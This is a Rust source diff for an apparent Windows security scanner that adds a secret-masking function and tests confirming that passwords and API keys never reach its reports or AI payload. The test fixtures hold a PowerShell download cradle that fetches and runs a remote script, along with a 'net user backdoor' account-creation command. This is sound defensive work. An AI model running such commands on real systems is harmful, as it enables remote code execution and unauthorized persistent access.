@@ -222,6 +222,85 @@ pub(crate) fn line_kinds(line: &str) -> Vec<&'static str> {
     out
 }
 
+// `GENERIC` without its leading word boundary, for masking only: `$dbPassword="…"` and
+// `GEMINI_API_KEY=…` hide the key word inside a longer name.
+rx!(
+    GENERIC_ANYWHERE,
+    r#"(?i)(password|passwd|pwd|secret|token|api[_-]?key|apikey|access[_-]?key|client[_-]?secret)["']?\s*[:=]\s*["']?([^\s"'&;,)]{3,})"#
+);
+
+/// Replaces the value of every secret this module recognizes with `<redacted>`, keeping the rest
+/// of the text. Excerpts that leave the scanner (a PowerShell history command, a profile snippet)
+/// go through this, so what `line_kinds` would report as a secret never appears in them.
+/// Placeholders (`$var`, `<your-key>`, `****`) are kept: they are not values.
+pub(crate) fn mask_values(text: &str) -> String {
+    if text.is_empty() {
+        return String::new();
+    }
+    text.split_inclusive('\n').map(mask_line).collect()
+}
+
+fn mask_line(line: &str) -> String {
+    let mut spans: Vec<(usize, usize)> = Vec::new();
+    // Whole tokens: their shape says they are keys.
+    for re in [&*AWS_KEY, &*GITHUB_TOKEN, &*SLACK_TOKEN, &*ANTHROPIC_KEY, &*OPENAI_KEY] {
+        spans.extend(re.matches(line).iter().map(|m| (m.start(), m.end())));
+    }
+    // `AccountKey=value`, `Bearer value`: the value after the separator.
+    for m in AZURE_KEY.matches(line) {
+        if let Some(eq) = m.as_str().find('=') {
+            spans.push((m.start() + eq + 1, m.end()));
+        }
+    }
+    for m in BEARER.matches(line) {
+        if let Some(space) = m.as_str().find(char::is_whitespace) {
+            let rest = &m.as_str()[space..];
+            let skip = rest.len() - rest.trim_start().len();
+            spans.push((m.start() + space + skip, m.end()));
+        }
+    }
+    // Values in a capture group, unless they are placeholders.
+    let groups: [(&crate::lenient::Rx, &[usize]); 8] = [
+        (&URL_CREDS, &[1]),
+        (&CONN_PASSWORD, &[1]),
+        (&SECURE_STRING, &[1, 2]),
+        (&NET_USER, &[1]),
+        (&PASS_SWITCH, &[1]),
+        (&PASS_PARAM, &[1]),
+        (&GENERIC_ANYWHERE, &[2]),
+        (&ENV_LINE, &[2]),
+    ];
+    for (re, wanted) in groups {
+        for caps in re.captures_all(line) {
+            for g in wanted {
+                if let Some(m) = caps.get(*g) {
+                    let value = m.as_str().trim_end_matches(['\r', '\n']);
+                    if !value.trim().is_empty() && !placeholder(value) {
+                        spans.push((m.start(), m.start() + value.len()));
+                    }
+                }
+            }
+        }
+    }
+    if spans.is_empty() {
+        return line.to_string();
+    }
+    spans.sort_unstable();
+    let mut out = String::with_capacity(line.len());
+    let mut at = 0;
+    for (start, end) in spans {
+        if end <= at {
+            continue;
+        }
+        let start = start.max(at);
+        out.push_str(&line[at..start]);
+        out.push_str("<redacted>");
+        at = end;
+    }
+    out.push_str(&line[at..]);
+    out
+}
+
 // --------------------------------------------------------------------------- one file's findings
 
 /// What a file holds: the kinds found and the line numbers (empty when only the end was read).
@@ -1295,6 +1374,70 @@ mod tests {
     }
 
     #[test]
+    fn the_excerpt_scrubber_hides_every_value_this_module_finds() {
+        const FAKE_PAT: &str = "github_pat_EXAMPLEexampleEXAMPLEexample00000000000000";
+        const FAKE_ASIA: &str = "ASIAEXAMPLEEXAMPLE00";
+        const FAKE_AZURE: &str = "EXAMPLEexampleEXAMPLEexample0000==";
+        const FAKE_GEMINI: &str = "fake-gemini-key-0000-example";
+        let lines = [
+            format!("$env:AWS_ACCESS_KEY_ID = '{FAKE_AWS}'"),
+            format!("git clone https://{FAKE_GITHUB}@github.com/contoso/app"),
+            format!("curl -H \"Authorization: Bearer {FAKE_OPENAI}\""),
+            format!("$k = \"{FAKE_ANTHROPIC}\""),
+            format!("$s = ConvertTo-SecureString \"{FAKE_PASSWORD}\" -AsPlainText -Force"),
+            format!("net user jdoe {FAKE_PASSWORD} /add"),
+            format!("net user backdoor {FAKE_PASSWORD} /add"),
+            format!("cmdkey /generic:host /user:jdoe /pass:{FAKE_PASSWORD}"),
+            format!("Connect-Thing -Server db -Password {FAKE_PASSWORD}"),
+            format!("Server=db;Database=app;User Id=sa;Password={FAKE_PASSWORD};"),
+            format!("client_secret = {FAKE_SECRET}"),
+            format!("$dbPassword=\"{FAKE_PASSWORD}\""),
+            format!("$env:GEMINI_API_KEY={FAKE_GEMINI}"),
+            format!("GEMINI_API_KEY={FAKE_GEMINI}"),
+            format!("git remote add origin https://x:{FAKE_PAT}@github.com/contoso/app"),
+            format!("$env:AWS_SESSION = '{FAKE_ASIA}'"),
+            format!("DefaultEndpointsProtocol=https;AccountName=contoso;AccountKey={FAKE_AZURE};"),
+            format!("Invoke-WebRequest https://jdoe:{FAKE_PASSWORD}@files.contoso.example/x"),
+        ];
+        let values = [
+            FAKE_AWS,
+            FAKE_GITHUB,
+            FAKE_OPENAI,
+            FAKE_ANTHROPIC,
+            FAKE_PASSWORD,
+            FAKE_SECRET,
+            FAKE_PAT,
+            FAKE_ASIA,
+            FAKE_AZURE,
+            FAKE_GEMINI,
+        ];
+        for line in &lines {
+            let scrubbed = crate::privacy::scrub_secrets(line);
+            for value in values {
+                assert!(
+                    !scrubbed.contains(value),
+                    "{value} left in {scrubbed:?} (from {line:?})"
+                );
+            }
+        }
+        // Several lines at once (a profile snippet) and placeholders kept as they are.
+        let block = lines.join("\n");
+        let scrubbed = crate::privacy::scrub_secrets(&block);
+        assert_eq!(scrubbed.lines().count(), lines.len());
+        for value in values {
+            assert!(!scrubbed.contains(value), "{value} left in the block");
+        }
+        for quiet in [
+            "$s = ConvertTo-SecureString $plain -AsPlainText -Force",
+            "net user jdoe * /add",
+            "msbuild app.sln /p:Configuration=Release",
+            "Get-ChildItem -Path C:\\Users\\jdoe",
+        ] {
+            assert_eq!(crate::privacy::scrub_secrets(quiet), quiet);
+        }
+    }
+
+    #[test]
     fn setup_files_ignore_the_value_windows_deleted() {
         let filled = "<AutoLogon>\n<Password>\n<Value>Q29udG9zbw==</Value>\n<PlainText>false</PlainText>\n</Password>\n</AutoLogon>";
         let found = unattend_found(filled);
@@ -1564,6 +1707,58 @@ mod tests {
             assert!(!html.contains(fake), "report HTML holds {fake}");
             assert!(!to_ai.contains(fake), "AI payload holds {fake}");
             assert!(!saved.contains(fake), "sent-to-ai file holds {fake}");
+        }
+    }
+
+    /// A risky PowerShell history line and a flagged profile become findings with an excerpt; the
+    /// excerpt must not carry the password or key in them (report, HTML, AI payload).
+    #[test]
+    fn history_and_profile_excerpts_never_hold_a_value() {
+        const FAKE_GEMINI: &str = "fake-gemini-key-0000-example";
+        let cradle = "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a.ps1')";
+        let history = format!("net user backdoor {FAKE_PASSWORD} /add; {cradle}");
+        let secure = format!(
+            "$p = ConvertTo-SecureString \"{FAKE_PASSWORD}\" -AsPlainText -Force; $env:GEMINI_API_KEY={FAKE_GEMINI}; {cradle}"
+        );
+        let profile = format!("$dbPassword=\"{FAKE_PASSWORD}\"\n$key = '{FAKE_AWS}'\n{cradle}\n");
+        let raw = json!({
+            "meta": {"is_admin": true, "user": "jdoe", "computer": "PC-VICTIM"},
+            "system": {"defender": {"realtime": true, "antivirus": true}},
+            "events": {"ps_commands": [
+                {"cmd": history, "last": "2026-11-20T10:00:00", "n": 1},
+                {"cmd": secure, "last": "2026-11-20T10:05:00", "n": 2},
+            ]},
+            "sysconfig": {"persistence": {"ps_profiles": [
+                {"path": r"C:\Users\jdoe\Documents\WindowsPowerShell\profile.ps1", "scope": "user", "content": profile},
+            ]}},
+        });
+        let mut analysis = crate::run_analysis(&raw, false);
+        let json_report = crate::report::render_json(&analysis);
+        assert!(
+            json_report.contains("DownloadString"),
+            "the history line and the profile are findings with an excerpt"
+        );
+        let html = crate::report::render_html(&analysis);
+        let sent = std::sync::Arc::new(std::sync::Mutex::new(String::new()));
+        let capture = std::sync::Arc::clone(&sent);
+        let provider = crate::ai::Provider::custom(
+            "test",
+            "fake-model",
+            "a test function",
+            Box::new(move |system, user, _schema| {
+                if let Ok(mut all) = capture.lock() {
+                    all.push_str(system);
+                    all.push_str(user);
+                }
+                Err(crate::ai::failed("no model in tests"))
+            }),
+        );
+        let _ = crate::ai::ai_analyze(&mut analysis, &provider, true, &|_| {}, None);
+        let to_ai = sent.lock().map(|s| s.clone()).unwrap_or_default();
+        for fake in [FAKE_PASSWORD, FAKE_GEMINI, FAKE_AWS] {
+            assert!(!json_report.contains(fake), "report JSON holds {fake}");
+            assert!(!html.contains(fake), "report HTML holds {fake}");
+            assert!(!to_ai.contains(fake), "AI payload holds {fake}");
         }
     }
 
